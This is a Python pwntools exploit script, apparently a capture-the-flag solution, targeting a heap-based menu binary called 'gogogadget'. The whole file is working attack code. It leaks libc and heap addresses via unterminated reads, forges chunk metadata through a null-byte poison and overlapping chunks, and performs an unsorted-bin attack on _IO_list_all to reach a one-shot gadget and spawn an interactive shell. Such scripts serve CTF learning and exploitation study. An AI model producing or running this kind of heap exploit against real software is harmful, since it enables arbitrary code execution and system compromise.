from pwn import *

def alloc(data):
	r.sendlineafter('Gadget: ', '1')

	if len(data) < 0xa8:
		data += '\n'
	r.sendafter('Gadget :', data)
	return

def free(idx):
	r.sendlineafter('Gadget: ', '2')
	r.sendlineafter('[id] :', str(idx))
	return

def activate(speed, data):
	r.sendlineafter('Gadget: ', '4')
	r.sendlineafter('Speed :', str(speed))
	r.sendafter('Destination :', data)
	return

def deactivate():
	r.sendlineafter('Gadget: ', '5')
	return

def pr(ru):
	r.sendlineafter('Gadget: ', '6')
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc('kek')
	alloc('kek')

	free(0)

	# The copter's data is read in via read(), aka no null termination.
	activate(1337, 'A'*8)

	libc   = pr('A'*8) - 0x3c4c18
	magic  = libc + 0xf1147
	iolist = libc + 0x3c5520
	log.success('Libc: 0x{:x}'.format(libc))

	# Clean up the heap and start fresh.
	deactivate()
	free(1)

	# Free 2 gadgets to get a heap leak.
	alloc('kek')
	alloc('kek')
	alloc('kek')
	alloc('kek')

	free(0)
	free(2)

	# Chunk_0's bk pointer points to chunk_2. Allocate a copter
	# and leak the heap address
	activate(1337, 'A'*8)
	heap = pr('A'*8) - 0x160
	log.success('Heap: 0x{:x}'.format(heap))

	# Clean up the heap and start fresh.
	deactivate()
	free(1)
	free(3)

	alloc('A'*8) # 0
	alloc('B'*8) # 1
	alloc('C'*8) # 2
	alloc('D'*8) # 3
	alloc('E'*8) # 4

	free(0)
	free(1)
	free(2)
	free(3)

	# null poison +  set up fake vtable 
	alloc(p64(2) + p64(3) + p64(magic) + 'F'* (0xa8 - 3*8)) # 0
	alloc('G'*0x10) # 1
	activate(0x1337, 'X'*8)

	free(1)
	# Overlap top chunk 
	free(4)

	alloc('H'*0x10) # 1
	# Let the overlap begin
	alloc('I'*0x10) # 2
	# this gadget will overlap with #1
	# we overwrite its size with 0x91, so that we don't get it
	# back when creating a new gadget
	alloc('J'*0x58 + p64(0x91)) # 3
	# patch the gadget so that gadget #3 looks legit
	alloc('K'*0x38 + p64(0x31) * 1 + p64(heap) + p64(0x31) + p64(0) + p64(0x31)*4 + p64(heap + 8)) # 4

	# first we need to free gadget #3 in order to request it back -- then we free gadget #1
	free(3)
	free(1)

	# then we get gadget #3 back (unsorted list is FIFO) while also overwriting gadget's #1 
	# size with 0x61 so that it gets placed in smallbin[4]
	alloc('L'*0x50 + '/bin/sh\x00' + p64(0x61) + 'kek'.ljust(8, chr(0)) + p64(iolist - 0x10) + p64(2) + p64(3))

	# unsorted bin attack on _io_list_all => _IO_flush_all_lockp => one shot gadget
	r.sendline('1')

	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./gogogadget')
        pause()
        pwn()
